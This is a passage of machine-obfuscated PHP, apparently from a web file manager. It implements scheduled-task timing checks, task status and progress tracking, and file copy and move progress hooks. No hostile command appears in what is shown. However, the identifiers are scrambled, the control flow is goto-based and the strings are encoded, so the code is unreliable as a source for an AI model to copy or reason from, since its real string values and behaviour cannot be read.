$C²×Æìˆø•[$Aº®²Ë²®¬]; if ($C·†•—ø‹[$a«áŠÊ·šÅ[1381]] != $a«áŠÊ·šÅ[83]) { continue; } if (!self::taskTimeCheck($C·†•—ø‹)) { continue; } self::taskRun($C·†•—ø‹); } Hook::trigger($a«áŠÊ·šÅ[1382]); } private static function taskTimeCheck($bÃ‘˜ˆãç²) { goto CïÕé¥ƒ; CïÕé¥ƒ: $B¤‰Ş­„¹´ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $dÔˆšêİºÅ = json_decode($bÃ‘˜ˆãç²[$B¤‰Ş­„¹´[187]], !0); $CÙ«›ã÷”Ş = intval($bÃ‘˜ˆãç²[$B¤‰Ş­„¹´[1374]]); goto b‚æÊÜííÊ; b‚æÊÜííÊ: $E…Ä”ßÀ›ô = strtotime($B¤‰Ş­„¹´[1383] . $dÔˆšêİºÅ[$B¤‰Ş­„¹´[1384]] . $B¤‰Ş­„¹´[1385]) - strtotime($B¤‰Ş­„¹´[1386]); $B³Á‚­ŒÕ” = time() - strtotime(date($B¤‰Ş­„¹´[1387]) . $B¤‰Ş­„¹´[1388]); $F¨ù®îîé = $B³Á‚­ŒÕ” >= $E…Ä”ßÀ›ô && $B³Á‚­ŒÕ” <= $E…Ä”ßÀ›ô + 3600; goto a…©‚ ³¸±; a…©‚ ³¸±: switch ($dÔˆšêİºÅ[$B¤‰Ş­„¹´[29]]) { case $B¤‰Ş­„¹´[1389]: if (time() - $CÙ«›ã÷”Ş < 3600 * 24 * 30) { return !1; } if ($dÔˆšêİºÅ[$B¤‰Ş­„¹´[1389]] == date($B¤‰Ş­„¹´[1390]) && $F¨ù®îîé) { return !0; } break; case $B¤‰Ş­„¹´[1391]: if (time() - $CÙ«›ã÷”Ş < 3600 * 24 * 7) { return !1; } $bŸĞ°§àÕÁ = date($B¤‰Ş­„¹´[1392]) == 0 ? 7 : date($B¤‰Ş­„¹´[1392]); if ($dÔˆšêİºÅ[$B¤‰Ş­„¹´[1391]] == $bŸĞ°§àÕÁ && $F¨ù®îîé) { return !0; } break; case $B¤‰Ş­„¹´[1384]: if (time() - $CÙ«›ã÷”Ş < 3600 * 24) { return !1; } if ($F¨ù®îîé) { return !0; } break; case $B¤‰Ş­„¹´[1393]: if (time() - $CÙ«›ã÷”Ş >= floatval($dÔˆšêİºÅ[$B¤‰Ş­„¹´[1393]]) * 60) { return !0; } break; default: break; } return !1; goto Fèº“¶Ñİ°; Fèº“¶Ñİ°: } public static function taskRun($eÙë¥À„Ëø) { goto aÚœÛÏ¸Ã¾; A“«Å³Û¨: $FÔ÷¤¿ÃÖƒ = timeFloat(); $CÖ·›á÷” = $Dº³Ë‰’[33]; switch ($eÙë¥À„Ëø[$Dº³Ë‰’[29]]) { case $Dº³Ë‰’[292]: $FÔ¦„¯­£¿ = url_request($eÙë¥À„Ëø[$Dº³Ë‰’[1397]], $Dº³Ë‰’[213], !1, !1, !1, !1, 5); $CÖ·›á÷” = strlen($FÔ¦„¯­£¿); break; case $Dº³Ë‰’[212]: $CÖ·›á÷” = Hook::apply($eÙë¥À„Ëø[$Dº³Ë‰’[1397]]); default: break; } goto eïÒˆËôá; eïÒˆËôá: Model($Dº³Ë‰’[1398])->add(array($Dº³Ë‰’[1399] => $Dº³Ë‰’[33], $Dº³Ë‰’[1400] => $Dº³Ë‰’[464], $Dº³Ë‰’[29] => $Dº³Ë‰’[1401] . $eÙë¥À„Ëø[$Dº³Ë‰’[364]], $Dº³Ë‰’[1402] => json_encode(array($Dº³Ë‰’[28] => $eÙë¥À„Ëø[$Dº³Ë‰’[28]], $Dº³Ë‰’[1403] => timeFloat() - $FÔ÷¤¿ÃÖƒ, $Dº³Ë‰’[278] => $CÖ·›á÷”)))); self::log($Dº³Ë‰’[1404] . $eÙë¥À„Ëø[$Dº³Ë‰’[364]] . $Dº³Ë‰’[1405] . $CÖ·›á÷”); return !0; goto Eí Óñâ£; aÚœÛÏ¸Ã¾: $Dº³Ë‰’ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; self::log($Dº³Ë‰’[1394] . $eÙë¥À„Ëø[$Dº³Ë‰’[364]] . $Dº³Ë‰’[1395] . $eÙë¥À„Ëø[$Dº³Ë‰’[28]] . $Dº³Ë‰’[1396] . $eÙë¥À„Ëø[$Dº³Ë‰’[1397]]); Model($Dº³Ë‰’[1380])->run($eÙë¥À„Ëø[$Dº³Ë‰’[364]]); goto A“«Å³Û¨; Eí Óñâ£: } private static function valueGet($ešÎ©à×¥’) { $fëå¤éšÊ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $C†¶„š´à = $fëå¤éšÊ[1406]; $EÁäŒ‚Òœ… = Model($fëå¤éšÊ[1407])->get($ešÎ©à×¥’, $C†¶„š´à); if (is_null($EÁäŒ‚Òœ…)) { Model($fëå¤éšÊ[1407])->set($fëå¤éšÊ[1378], 10, $C†¶„š´à); Model($fëå¤éšÊ[1407])->set($fëå¤éšÊ[684], $fëå¤éšÊ[83], $C†¶„š´à); Model($fëå¤éšÊ[1407])->set($fëå¤éšÊ[1373], $fëå¤éšÊ[464], $C†¶„š´à); $EÁäŒ‚Òœ… = Model($fëå¤éšÊ[1407])->get($ešÎ©à×¥’, $C†¶„š´à); } return $EÁäŒ‚Òœ…; } private static function valueSet($b¯„¯–õ, $dò²İ‡š™) { $Cå•˜Ùã´© =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; return Model($Cå•˜Ùã´©[1407])->set($b¯„¯–õ, $dò²İ‡š™, $Cå•˜Ùã´©[1406]); } protected static function log($cŞ»ßéÛÇå) { write_log($cŞ»ßéÛÇå, $_SERVER[ÚŠ•´ÍéÒÑÔ][1408]); } private static function cacheClear() { $a‚ë“íğÍß =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $A¸Áßâ…Ì = Model($a‚ë“íğÍß[1407])->cacheKey($a‚ë“íğÍß[1406]); Cache::clearMemory($A¸Áßâ…Ì); } } class Task { const STATYS_STOP = "\x73\164\157\160"; const STATYS_RUNNING = "\x72\165\156\156\x69\x6e\147"; const STATYS_KILL = "\153\x69\154\154"; public $task; public function __destruct() { $this->end(); } public function __construct($fºÆƒÑˆ­Ä, $Fèš¼Şğ § = '', $BĞ¾Â˜‹õ„ = 0, $eˆÏÒŒ‰”É = '') { goto CÑÁí‚¸ÌÂ; A†÷‡æÔ³: Hook::trigger($EÒäôÎ­§Ä[1420], $this->task); $this->task[$EÒäôÎ­§Ä[1414]] = timeFloat(); self::valueSet($this->task[$EÒäôÎ­§Ä[364]], $this->task); goto F¹‡•êŞ¦”; CÌ‡›ÚõÓ¡: Hook::bind($EÒäôÎ­§Ä[1375], array($this, $EÒäôÎ­§Ä[1417])); Hook::bind($EÒäôÎ­§Ä[1418], array($this, $EÒäôÎ­§Ä[1419])); $this->startAfter(); goto A†÷‡æÔ³; CÑÁí‚¸ÌÂ: $EÒäôÎ­§Ä =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (self::get($fºÆƒÑˆ­Ä)) { return; } $this->task = array($EÒäôÎ­§Ä[364] => $fºÆƒÑˆ­Ä, $EÒäôÎ­§Ä[1409] => USER_ID, $EÒäôÎ­§Ä[1316] => $eˆÏÒŒ‰”É, $EÒäôÎ­§Ä[29] => $Fèš¼Şğ §, $EÒäôÎ­§Ä[972] => $EÒäôÎ­§Ä[33], $EÒäôÎ­§Ä[970] => $BĞ¾Â˜‹õ„, $EÒäôÎ­§Ä[982] => 0, $EÒäôÎ­§Ä[1410] => 0, $EÒäôÎ­§Ä[1411] => 0, $EÒäôÎ­§Ä[1412] => timeFloat(), $EÒäôÎ­§Ä[1413] => 0, $EÒäôÎ­§Ä[1414] => 0, $EÒäôÎ­§Ä[1415] => 0, $EÒäôÎ­§Ä[1416] => 0, $EÒäôÎ­§Ä[684] => $EÒäôÎ­§Ä[1373]); goto CÌ‡›ÚõÓ¡; F¹‡•êŞ¦”: } public function end() { goto FÇ»ŒÌ¶Û·; FÇ»ŒÌ¶Û·: $aä¥º¤Ùøì =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$this->task) { return; } if ($this->task[$aä¥º¤Ùøì[1414]]) { self::valueSet($this->task[$aä¥º¤Ùøì[364]], !1); } goto FâãëÑ Ğ ; c†‡›é¿õ÷: Hook::unbind($aä¥º¤Ùøì[1418], array($this, $aä¥º¤Ùøì[1419])); $this->endAfter(); $this->task = !1; goto D«²‹èõ; FâãëÑ Ğ : $d‘˜–›İ½ = timeFloat() - $this->task[$aä¥º¤Ùøì[1412]]; self::log($aä¥º¤Ùøì[1421] . $this->task[$aä¥º¤Ùøì[364]] . $aä¥º¤Ùøì[1422] . $d‘˜–›İ½ . $aä¥º¤Ùøì[1423]); Hook::unbind($aä¥º¤Ùøì[1375], array($this, $aä¥º¤Ùøì[1417])); goto c†‡›é¿õ÷; D«²‹èõ: } public function update($CÆ“·Ò¾ø× = 0) { goto Fİ…¨­Ğ»Š; B­·‹¹„ä™: $this->updateAfter(); $Cğ­Ğñ¿øô = 0.2; if (timeFloat() - $DÀÑ´¤Äƒö[$D¿Øã‡¹[1414]] < $Cğ­Ğñ¿øô) { return; } goto dÎ·™®ƒë÷; Fİ…¨­Ğ»Š: $D¿Øã‡¹ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $DÀÑ´¤Äƒö =& $this->task; if (!$DÀÑ´¤Äƒö) { return; } goto Eèåùã§¢­; BöšÄàâ£²: $DÀÑ´¤Äƒö[$D¿Øã‡¹[684]] = $F‹·×Î¬¦¡ ? $F‹·×Î¬¦¡ : $DÀÑ´¤Äƒö[$D¿Øã‡¹[684]]; $DÀÑ´¤Äƒö[$D¿Øã‡¹[1415]] = $fÉÑàÖ‡¿†[$D¿Øã‡¹[1415]] ? $fÉÑàÖ‡¿†[$D¿Øã‡¹[1415]] : 0; $DÀÑ´¤Äƒö[$D¿Øã‡¹[1414]] = timeFloat(); goto d¬›¬¤•Ü; Eèåùã§¢­: $DÀÑ´¤Äƒö[$D¿Øã‡¹[982]] += $CÆ“·Ò¾ø×; $DÀÑ´¤Äƒö[$D¿Øã‡¹[1413]] = timeFloat(); if ($DÀÑ´¤Äƒö[$D¿Øã‡¹[970]]) { if ($DÀÑ´¤Äƒö[$D¿Øã‡¹[970]] < $DÀÑ´¤Äƒö[$D¿Øã‡¹[982]]) { $DÀÑ´¤Äƒö[$D¿Øã‡¹[970]] = $DÀÑ´¤Äƒö[$D¿Øã‡¹[982]]; } $F×İËÎÓ‘Ï = timeFloat() - $DÀÑ´¤Äƒö[$D¿Øã‡¹[1412]] - $DÀÑ´¤Äƒö[$D¿Øã‡¹[1415]]; $DÀÑ´¤Äƒö[$D¿Øã‡¹[1410]] = $DÀÑ´¤Äƒö[$D¿Øã‡¹[982]] / $DÀÑ´¤Äƒö[$D¿Øã‡¹[970]]; $DÀÑ´¤Äƒö[$D¿Øã‡¹[1411]] = $DÀÑ´¤Äƒö[$D¿Øã‡¹[982]] / $F×İËÎÓ‘Ï; if ($DÀÑ´¤Äƒö[$D¿Øã‡¹[1410]] > 0) { $DÀÑ´¤Äƒö[$D¿Øã‡¹[1416]] = $F×İËÎÓ‘Ï * (1 - $DÀÑ´¤Äƒö[$D¿Øã‡¹[1410]]) / $DÀÑ´¤Äƒö[$D¿Øã‡¹[1410]]; } $DÀÑ´¤Äƒö[$D¿Øã‡¹[1416]] = $DÀÑ´¤Äƒö[$D¿Øã‡¹[1416]] <= 0 ? 0 : $DÀÑ´¤Äƒö[$D¿Øã‡¹[1416]]; } goto B­·‹¹„ä™; dÎ·™®ƒë÷: $fÉÑàÖ‡¿† = self::get($DÀÑ´¤Äƒö[$D¿Øã‡¹[364]]); $F‹·×Î¬¦¡ = $fÉÑàÖ‡¿†[$D¿Øã‡¹[684]]; if ($F‹·×Î¬¦¡ == self::STATYS_KILL) { $AÅ¶øˆà‹í = array($D¿Øã‡¹[1424] => LNG($D¿Øã‡¹[1425]), $D¿Øã‡¹[1024] => !1); Cache::set($D¿Øã‡¹[1426] . $this->task[$D¿Øã‡¹[364]], $AÅ¶øˆà‹í, 30); $this->end(); die; } else { if ($F‹·×Î¬¦¡ == self::STATYS_STOP) { $añî¤İï”¹ = 2; $fÉÑàÖ‡¿†[$D¿Øã‡¹[1415]] += $añî¤İï”¹; self::valueSet($DÀÑ´¤Äƒö[$D¿Øã‡¹[364]], $fÉÑàÖ‡¿†); sleep($añî¤İï”¹); $this->update(); return; } } goto BöšÄàâ£²; d¬›¬¤•Ü: Hook::trigger($D¿Øã‡¹[1427], $DÀÑ´¤Äƒö); self::valueSet($DÀÑ´¤Äƒö[$D¿Øã‡¹[364]], $DÀÑ´¤Äƒö); goto Dê¬¢„ÜŞŒ; Dê¬¢„ÜŞŒ: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($FáÜòŒ¨Öğ) { $aÁ‰½ÓöŸ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; Cache::set($aÁ‰½ÓöŸ[1426] . $this->task[$aÁ‰½ÓöŸ[364]], $FáÜòŒ¨Öğ, 60); return $FáÜòŒ¨Öğ; } public static function get($aÀã…Õø…Ñ) { return self::valueGet($aÀã…Õø…Ñ); } public static function listData() { $D–µÕ ­ÛÔ = self::valueGet(); return array_sort_by($D–µÕ ­ÛÔ, $_SERVER[ÚŠ•´ÍéÒÑÔ][1412], !0); } public static function kill($cÔº˜ã¤™Å) { return self::changeStatus($cÔº˜ã¤™Å, self::STATYS_KILL); } public static function stop($BùŠÀÈÓˆ‰) { return self::changeStatus($BùŠÀÈÓˆ‰, self::STATYS_STOP); } public static function restart($Cø·…ÓåÑÂ) { return self::changeStatus($Cø·…ÓåÑÂ, self::STATYS_RUNNING); } public static function killAll() { $c‹ëï¤‡¥ä =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $câ¢×­” = self::listData(); foreach ($câ¢×­” as $bÒÛµî‚òâ) { self::kill($bÒÛµî‚òâ[$c‹ëï¤‡¥ä[364]]); } sleep(2); foreach ($câ¢×­” as $bÒÛµî‚òâ) { self::valueSet($bÒÛµî‚òâ[$c‹ëï¤‡¥ä[364]], !1); } } private static function changeStatus($FîÜÂ©ª‹³, $eÍ´‚‡Ÿ÷) { goto F…•ˆÇĞ¿; EÓø¦ë‡¦: return !0; goto cì½İ¸Æùª; F…•ˆÇĞ¿: $Aâõ®á¯ó =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $AÌ°·øÂ¯ƒ = self::valueGet($FîÜÂ©ª‹³); if (!$AÌ°·øÂ¯ƒ) { return !1; } goto eøËÓ©Ÿ°ù; eøËÓ©Ÿ°ù: $AÌ°·øÂ¯ƒ[$Aâõ®á¯ó[684]] = $eÍ´‚‡Ÿ÷; self::valueSet($FîÜÂ©ª‹³, $AÌ°·øÂ¯ƒ); self::log($Aâõ®á¯ó[1428] . $AÌ°·øÂ¯ƒ[$Aâõ®á¯ó[364]] . $Aâõ®á¯ó[1429] . $eÍ´‚‡Ÿ÷); goto EÓø¦ë‡¦; cì½İ¸Æùª: } public static function valueGet($FËÅİ¿ô¬– = false) { $cšµéµæ‡’ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($FËÅİ¿ô¬–) { $C¤‡‡Ù…¾× = Model($cšµéµæ‡’[395])->where(array($cšµéµæ‡’[89] => $FËÅİ¿ô¬–, $cšµéµæ‡’[29] => $cšµéµæ‡’[1430]))->find(); return $C¤‡‡Ù…¾× ? json_decode($C¤‡‡Ù…¾×[$cšµéµæ‡’[356]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($bìïğƒììÜ = false) { goto bÚ†³ö…¿; bÚ†³ö…¿: $BÂİ£Ä‹ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $CÁ´§¥°˜± = array($BÂİ£Ä‹[29] => $BÂİ£Ä‹[1430]); if ($bìïğƒììÜ) { $CÁ´§¥°˜±[$BÂİ£Ä‹[1409]] = $bìïğƒììÜ; } goto fí‘‚´õÓŸ; e­­®è…¶°: return $a¿ò£ÎµÇ÷; goto F£ºÀ‘ˆÑ’; fí‘‚´õÓŸ: $a¿ò£ÎµÇ÷ = Model($BÂİ£Ä‹[395])->where($CÁ´§¥°˜±)->select(); $a¿ò£ÎµÇ÷ = $a¿ò£ÎµÇ÷ ? $a¿ò£ÎµÇ÷ : array(); foreach ($a¿ò£ÎµÇ÷ as $d‚øòõ¤®ƒ => $Câ˜Ù‰÷­¤) { $a¿ò£ÎµÇ÷[$d‚øòõ¤®ƒ] = json_decode($Câ˜Ù‰÷­¤[$BÂİ£Ä‹[356]], !0); } goto e­­®è…¶°; F£ºÀ‘ˆÑ’: } public static function valueSet($aùèàÑ¾ÒÅ, $eß¶¸ç™Ã) { goto EÒ–Ò¦Øë‹; f‹¨ŠÑŞî†: Model($aò°¾Ì°®ä[395])->add($d±Ø’Š–ŒÔ, array(), !0); goto D³™×ÑÕÙ; EÒ–Ò¦Øë‹: $aò°¾Ì°®ä =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$eß¶¸ç™Ã) { return Model($aò°¾Ì°®ä[395])->where(array($aò°¾Ì°®ä[89] => $aùèàÑ¾ÒÅ, $aò°¾Ì°®ä[29] => $aò°¾Ì°®ä[1430]))->delete(); } $b•Œäˆì¦ = json_encode($eß¶¸ç™Ã); goto cÌ¸Î´Ÿ³; cÌ¸Î´Ÿ³: if (!$b•Œäˆì¦) { ob_start(); var_dump($eß¶¸ç™Ã); $CŒÜçàˆêÔ = ob_get_clean(); self::log($aò°¾Ì°®ä[1431] . json_encode_force($CŒÜçàˆêÔ)); } if (!$aùèàÑ¾ÒÅ || !$eß¶¸ç™Ã[$aò°¾Ì°®ä[364]]) { return !1; } $d±Ø’Š–ŒÔ = array($aò°¾Ì°®ä[29] => $aò°¾Ì°®ä[1430], $aò°¾Ì°®ä[1409] => USER_ID, $aò°¾Ì°®ä[89] => $aùèàÑ¾ÒÅ, $aò°¾Ì°®ä[356] => $b•Œäˆì¦); goto f‹¨ŠÑŞî†; D³™×ÑÕÙ: } public static function log($aÌ„â»ğé) { write_log($aÌ„â»ğé, $_SERVER[ÚŠ•´ÍéÒÑÔ][1432]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto d¡¼ïÕŠóµ; fˆ¿°â‚åö: $fÙö³’ñŒ[$DÈó…£”“Ù[1452]] = LNG($DÈó…£”“Ù[1453]); $fÙö³’ñŒ[$DÈó…£”“Ù[1454]] = 0; $fÙö³’ñŒ[$DÈó…£”“Ù[1455]] = 0; goto a÷á‚±î×‡; D”£İ¤ç‡Ã: Hook::bind($DÈó…£”“Ù[1446], array($this, $DÈó…£”“Ù[1447])); Hook::bind($DÈó…£”“Ù[1448], array($this, $DÈó…£”“Ù[1449])); Hook::bind($DÈó…£”“Ù[1450], array($this, $DÈó…£”“Ù[1451])); goto fˆ¿°â‚åö; f•‹Ç¾¼: Hook::bind($DÈó…£”“Ù[1443], array($this, $DÈó…£”“Ù[1444])); Hook::bind($DÈó…£”“Ù[528], array($this, $DÈó…£”“Ù[1445])); $this->sourceModelCopyFlag = !1; goto D”£İ¤ç‡Ã; d³ã’ç§šÆ: Hook::bind($DÈó…£”“Ù[539], array($this, $DÈó…£”“Ù[1441])); Hook::bind($DÈó…£”“Ù[505], array($this, $DÈó…£”“Ù[1442])); Hook::bind($DÈó…£”“Ù[502], array($this, $DÈó…£”“Ù[1442])); goto aËŸ¤¿Ô¤; E¾ƒºÛÚÊ: Hook::bind($DÈó…£”“Ù[535], array($this, $DÈó…£”“Ù[1439])); Hook::bind($DÈó…£”“Ù[536], array($this, $DÈó…£”“Ù[1440])); Hook::bind($DÈó…£”“Ù[538], array($this, $DÈó…£”“Ù[1441])); goto d³ã’ç§šÆ; EŠ¦ƒåâÖ’: if (!$fÙö³’ñŒ[$DÈó…£”“Ù[1316]]) { $fÙö³’ñŒ[$DÈó…£”“Ù[1316]] = LNG($DÈó…£”“Ù[1458]); } goto B¹Œ£ÜÅÉ»; a÷á‚±î×‡: $fÙö³’ñŒ[$DÈó…£”“Ù[972]] = $DÈó…£”“Ù[33]; $fÙö³’ñŒ[$DÈó…£”“Ù[1456]] = $DÈó…£”“Ù[33]; $fÙö³’ñŒ[$DÈó…£”“Ù[1457]] = 0; goto EŠ¦ƒåâÖ’; F¯ŞŸº—ùÅ: Hook::bind($DÈó…£”“Ù[1433], array($this, $DÈó…£”“Ù[1434])); Hook::bind($DÈó…£”“Ù[1435], array($this, $DÈó…£”“Ù[1436])); Hook::bind($DÈó…£”“Ù[1437], array($this, $DÈó…£”“Ù[1438])); goto E¾ƒºÛÚÊ; d¡¼ïÕŠóµ: $DÈó…£”“Ù =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fÙö³’ñŒ =& $this->task; $this->sourceCopyFolder = !1; goto F¯ŞŸº—ùÅ; aËŸ¤¿Ô¤: Hook::bind($DÈó…£”“Ù[507], array($this, $DÈó…£”“Ù[1442])); Hook::bind($DÈó…£”“Ù[509], array($this, $DÈó…£”“Ù[1442])); Hook::bind($DÈó…£”“Ù[511], array($this, $DÈó…£”“Ù[1442])); goto f•‹Ç¾¼; B¹Œ£ÜÅÉ»: } protected function endAfter() { goto C‘ïäº¼ï¨; b‰¤¼ß“Ğë: Hook::unbind($e®Ğ¹ªĞàç[511], array($this, $e®Ğ¹ªĞàç[1442])); Hook::unbind($e®Ğ¹ªĞàç[1443], array($this, $e®Ğ¹ªĞàç[1444])); Hook::unbind($e®Ğ¹ªĞàç[528], array($this, $e®Ğ¹ªĞàç[1445])); goto F•‚í–æšÖ; c—”¼†ï¿: Hook::unbind($e®Ğ¹ªĞàç[1437], array($this, $e®Ğ¹ªĞàç[1438])); Hook::unbind($e®Ğ¹ªĞàç[535], array($this, $e®Ğ¹ªĞàç[1439])); Hook::unbind($e®Ğ¹ªĞàç[536], array($this, $e®Ğ¹ªĞàç[1440])); goto d‡÷Ìå›¸; FÛ¹ğ”›¦Ã: Hook::unbind($e®Ğ¹ªĞàç[502], array($this, $e®Ğ¹ªĞàç[1442])); Hook::unbind($e®Ğ¹ªĞàç[507], array($this, $e®Ğ¹ªĞàç[1442])); Hook::unbind($e®Ğ¹ªĞàç[509], array($this, $e®Ğ¹ªĞàç[1442])); goto b‰¤¼ß“Ğë; d‡÷Ìå›¸: Hook::unbind($e®Ğ¹ªĞàç[538], array($this, $e®Ğ¹ªĞàç[1441])); Hook::unbind($e®Ğ¹ªĞàç[539], array($this, $e®Ğ¹ªĞàç[1441])); Hook::unbind($e®Ğ¹ªĞàç[505], array($this, $e®Ğ¹ªĞàç[1442])); goto FÛ¹ğ”›¦Ã; C‘ïäº¼ï¨: $e®Ğ¹ªĞàç =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; Hook::unbind($e®Ğ¹ªĞàç[1433], array($this, $e®Ğ¹ªĞàç[1434])); Hook::unbind($e®Ğ¹ªĞàç[1435], array($this, $e®Ğ¹ªĞàç[1436])); goto c—”¼†ï¿; F•‚í–æšÖ: Hook::unbind($e®Ğ¹ªĞàç[1446], array($this, $e®Ğ¹ªĞàç[1447])); Hook::unbind($e®Ğ¹ªĞàç[1448], array($this, $e®Ğ¹ªĞàç[1449])); Hook::unbind($e®Ğ¹ªĞàç[1450], array($this, $e®Ğ¹ªĞàç[1451])); goto Aäà´Î±Ï; Aäà´Î±Ï: } public function copyMoveStart($F´ìäÅ¼, $C£Æƒ½²°¤, $EêñòÉ²æñ, $Fî†ˆ‰µ®¿) { } public function updateAfter() { goto EêËã÷šö¶; A§”Ú«ÈÉĞ: if ($this->sourceModelCopyFlag) { return; } $cÌ¢Ö«¢®é = 0; if ($fœ‹ôŒùæ¯[$CÔ«œ”ÔÀÜ[1456]] == $CÔ«œ”ÔÀÜ[1032]) { $cÌ¢Ö«¢®é = $fœ‹ôŒùæ¯[$CÔ«œ”ÔÀÜ[1455]] * 0.5; } else { if ($fœ‹ôŒùæ¯[$CÔ«œ”ÔÀÜ[1456]] == $CÔ«œ”ÔÀÜ[91]) { $cÌ¢Ö«¢®é = $fœ‹ôŒùæ¯[$CÔ«œ”ÔÀÜ[1455]] * 0.5 + $fœ‹ôŒùæ¯[$CÔ«œ”ÔÀÜ[1454]] * 0.5; } } goto F¹èÜ™Û; F¹èÜ™Û: $fœ‹ôŒùæ¯[$CÔ«œ”ÔÀÜ[1410]] = ($fœ‹ôŒùæ¯[$CÔ«œ”ÔÀÜ[1459]] + $cÌ¢Ö«¢®é) / $fœ‹ôŒùæ¯[$CÔ«œ”ÔÀÜ[693]]; if ($fœ‹ôŒùæ¯[$CÔ«œ”ÔÀÜ[1410]] > 0) { $D›ö‹‘ôå³ = timeFloat() - $fœ‹ôŒùæ¯[$CÔ«œ”ÔÀÜ[1412]] - $fœ‹ôŒùæ¯[$CÔ«œ”ÔÀÜ[1415]]; $fœ‹ôŒùæ¯[$CÔ«œ”ÔÀÜ[1416]] = $D›ö‹‘ôå³ * (1 - $fœ‹ôŒùæ¯[$CÔ«œ”ÔÀÜ[1410]]) / $fœ‹ôŒùæ¯[$CÔ«œ”ÔÀÜ[1410]]; } goto c°¢Ûá§§; EêËã÷šö¶: $CÔ«œ”ÔÀÜ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fœ‹ôŒùæ¯ =& $this->task; if (!$fœ‹ôŒùæ¯[$CÔ«œ”ÔÀÜ[693]]) { return; } goto A§”Ú«ÈÉĞ; c°¢Ûá§§: } public function addPath($BæÓÆÒÕŞĞ) { goto FÇöè¸¡±; A¾Ï“¡®˜İ: $B“ïÕ…ƒà = IO::infoWithChildren($BæÓÆÒÕŞĞ); $D££ö˜Ö»„ = $d•„ƒ¡£Ç¶[$A‚£Ø‘ßæ×[1460]] ? $d•„ƒ¡£Ç¶[$A‚£Ø‘ßæ×[1460]][$A‚£Ø‘ßæ×[1461]] : 0; $d•„ƒ¡£Ç¶[$A‚£Ø‘ßæ×[1460]] = array($A‚£Ø‘ßæ×[1461] => $D££ö˜Ö»„ + 1, $A‚£Ø‘ßæ×[383] => $B“ïÕ…ƒà[$A‚£Ø‘ßæ×[28]], $A‚£Ø‘ßæ×[75] => $B“ïÕ…ƒà[$A‚£Ø‘ßæ×[75]], $A‚£Ø‘ßæ×[462] => $B“ïÕ…ƒà[$A‚£Ø‘ßæ×[462]] ? $B“ïÕ…ƒà[$A‚£Ø‘ßæ×[462]] : $B“ïÕ…ƒà[$A‚£Ø‘ßæ×[75]]); goto BŞÀ„ÖŠ·Á; FÇöè¸¡±: $A‚£Ø‘ßæ× =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$BæÓÆÒÕŞĞ) { return; } $d•„ƒ¡£Ç¶ =& $this->task; goto A¾Ï“¡®˜İ; BŞÀ„ÖŠ·Á: if ($B“ïÕ…ƒà[$A‚£Ø‘ßæ×[29]] == $A‚£Ø‘ßæ×[164]) { $d•„ƒ¡£Ç¶[$A‚£Ø‘ßæ×[970]] += 1; } else { $d•„ƒ¡£Ç¶[$A‚£Ø‘ßæ×[970]] += $B“ïÕ…ƒà[$A‚£Ø‘ßæ×[80]][$A‚£Ø‘ßæ×[78]]; if ($B“ïÕ…ƒà[$A‚£Ø‘ßæ×[366]]) { $d•„ƒ¡£Ç¶[$A‚£Ø‘ßæ×[970]] += $B“ïÕ…ƒà[$A‚£Ø‘ßæ×[80]][$A‚£Ø‘ßæ×[79]] + 1; } } $d•„ƒ¡£Ç¶[$A‚£Ø‘ßæ×[693]] += $B“ïÕ…ƒà[$A‚£Ø‘ßæ×[77]]; $this->update(); goto a¨ŠÖ¶Ø–Š; a¨ŠÖ¶Ø–Š: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($bÜÆİí‰²Ç) { $e¢ˆÆÈƒôæ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $E¶Õ†Æ»õĞ =& $this->task; $E¶Õ†Æ»õĞ[$e¢ˆÆÈƒôæ[1452]] = $bÜÆİí‰²Ç[$e¢ˆÆÈƒôæ[28]]; $E¶Õ†Æ»õĞ[$e¢ˆÆÈƒôæ[972]] = $bÜÆİí‰²Ç[$e¢ˆÆÈƒôæ[28]]; $this->update(); } public function copyFileStart($B±ÑŒõò©, $A¸âµ±ğà, $EÂ¹‰µÆ´, $dÔ«Éñè£Š, $FÌä™‘—•¥, $eÖ›»Î×Î…) { goto BÏ¬˜Š«; E¥©‚ÚÅÂ“: $bİ§çñ”Ä÷[$aìÉøøÈµ¶[972]] = $aìÉøøÈµ¶[33]; $bİ§çñ”Ä÷[$aìÉøøÈµ¶[1456]] = $aìÉøøÈµ¶[33]; $bİ§çñ”Ä÷[$aìÉøøÈµ¶[1457]] = 0; goto CŒÒÁ–¡; CŒÒÁ–¡: $this->update(); goto B¿¼˜ÀÉµ; aËÖà‹™îÛ: $bİ§çñ”Ä÷[$aìÉøøÈµ¶[1452]] = $f· ß“×Ùç; $bİ§çñ”Ä÷[$aìÉøøÈµ¶[1454]] = (int) $B±ÑŒõò©->size($A¸âµ±ğà); $bİ§çñ”Ä÷[$aìÉøøÈµ¶[1455]] = 0; goto E¥©‚ÚÅÂ“; DÓÈ¥„¤ÎÆ: $GLOBALS[$aìÉøøÈµ¶[1463]] = $FÌä™‘—•¥; $GLOBALS[$aìÉøøÈµ¶[1462]] = $eÖ›»Î×Î…; $bİ§çñ”Ä÷ =& $this->task; goto aËÖà‹™îÛ; BÏ¬˜Š«: $aìÉøøÈµ¶ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $f· ß“×Ùç = $FÌä™‘—•¥; if ($f· ß“×Ùç == 